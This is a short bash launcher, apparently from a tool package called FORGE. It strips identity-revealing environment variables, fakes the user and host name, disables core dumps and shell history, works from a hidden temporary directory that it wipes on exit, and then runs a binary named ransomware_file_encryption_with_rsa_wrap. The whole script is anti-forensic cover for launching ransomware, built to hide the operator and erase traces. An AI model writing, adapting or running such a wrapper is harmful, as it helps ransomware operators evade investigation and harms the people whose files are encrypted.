#!/bin/bash
# FORGE OPSEC Runtime Wrapper — sanitize execution environment
set -euo pipefail


# === Environment Sanitization ===
# Strip all identity-revealing environment variables
unset USER USERNAME LOGNAME HOME HOSTNAME COMPUTERNAME
unset SUDO_USER SUDO_UID SUDO_GID SUDO_COMMAND
unset SSH_CLIENT SSH_CONNECTION SSH_TTY SSH_AUTH_SOCK
unset DISPLAY WAYLAND_DISPLAY XDG_SESSION_TYPE
unset MAIL EDITOR VISUAL SHELL
unset LANG LC_ALL LC_CTYPE  # Reset locale
export LANG=C.UTF-8
export TZ=UTC
export HOME=/tmp
export USER=user
export HOSTNAME=localhost

# === Disable Core Dumps ===
ulimit -c 0 2>/dev/null || true

# === Create tmpfs Workspace ===
TMPWORK=$(mktemp -d /tmp/.forge.XXXXXX)
trap "rm -rf $TMPWORK; unset HISTFILE; history -c 2>/dev/null" EXIT INT TERM

# === Disable Shell History ===
unset HISTFILE
export HISTSIZE=0

# === Process Name Obfuscation ===
# (binary name is already the tool name from PyInstaller)

# === Execute Tool ===
echo "[*] OPSEC runtime initialized"
echo "[*] Workspace: tmpfs (ephemeral)"
echo "[*] Identity: sanitized"
echo "[*] Core dumps: disabled"

cd "$TMPWORK"
exec /app/ransomware_file_encryption_with_rsa_wrap "$@"
